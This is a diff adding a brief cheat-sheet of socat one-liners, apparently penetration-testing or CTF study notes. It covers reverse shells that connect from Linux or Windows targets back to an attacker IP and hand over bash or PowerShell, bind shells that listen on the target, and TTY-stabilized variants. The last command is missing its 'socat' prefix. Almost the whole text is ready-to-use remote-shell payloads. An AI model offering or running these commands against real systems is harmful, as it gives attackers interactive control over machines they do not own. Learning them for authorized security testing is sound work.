@@ -1,0 +1,30 @@
+Normal
+Reverse Shell:
+	Listen on the local machine: 			socat tcp-l:8888 -
+	Connect back from "LINUX" target machine: 	socat tcp:10.25.4.76:8888 exec:"bash -li"
+	Connect back from "WINDOWS" target machine:	socat tcp:10.25.4.76:8888 exec:powershell.exe,pipes
+	
+
+
+Bind Shell: 
+	Listen on the "LINUX" target machine: 	socat tcp-l:8888 exec:"bash -li"
+	Listen on the "Windows" target machine: socat tcp-l:8888 exec:powershell.exe,pipes
+	Connect back from the local machine: 	socat tcp:10.10.42.35:8888 -
+
+
+
+NB: 
+	1. We can also use "netcat" to communicate with socat.
+	2. Always put a "-" after the "socat" command on the local machine.
+
+
+
+
+Stabilize the linux process or terminal:
+Reverse Shell:
+	Listen on the local machine: 			socat tcp-l:8888 file:`tty`,raw,echo=0
+	Connect back from "LINUX" target machine: 	socat tcp:10.25.4.76:8888 exec:"bash -li",pty,stderr,sigint,setsid,sane
+
+Bind Shell:
+	Listen on the "LINUX" target machine: 	socat tcp-l:8888 exec:"bash -li",pty,stderr,sigint,setsid,sane
+	Connect back from the local machine: 	tcp:10.10.42.35:8888 file:`tty`,raw,echo=0
